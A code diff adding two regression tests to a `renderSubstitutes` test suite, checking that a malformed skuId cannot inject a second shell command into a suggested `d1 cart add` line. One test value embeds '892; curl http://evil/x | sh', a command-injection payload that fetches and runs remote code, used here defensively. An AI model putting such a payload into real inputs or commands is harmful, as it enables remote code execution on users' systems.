@@ -274,6 +274,24 @@ describe("renderSubstitutes", () => {
     ...over,
   });
 
+  test("a non-numeric skuId does not become a second command in `d1 cart add`", () => {
+    // This line was already known to interpolate a raw upstream value — the
+    // comment at the ESC[2J test below says so — and `sanitize` only strips
+    // control characters, leaving `;` `|` and backticks. It was gated 340 lines
+    // after its twin in `alternativesNote`, and the twin's own docstring
+    // claimed it was the first such site. It was not.
+    const out = renderSubstitutes(
+      base({ candidates: [candidate("892; curl http://evil/x | sh", "LECHE", 320_000)] }),
+    );
+    expect(out).toContain("Nothing was added to your cart.");
+    expect(out).not.toContain("d1 cart add");
+    expect(out).not.toContain("curl");
+  });
+
+  test("a real skuId still gets its command, so the gate is not a blanket refusal", () => {
+    expect(renderSubstitutes(base())).toContain("d1 cart add 892");
+  });
+
   test("says the source is out of stock, and does not say the opposite", () => {
     const out = renderSubstitutes(base({ sourceAvailable: false }));
     expect(out).toContain("cannot supply");
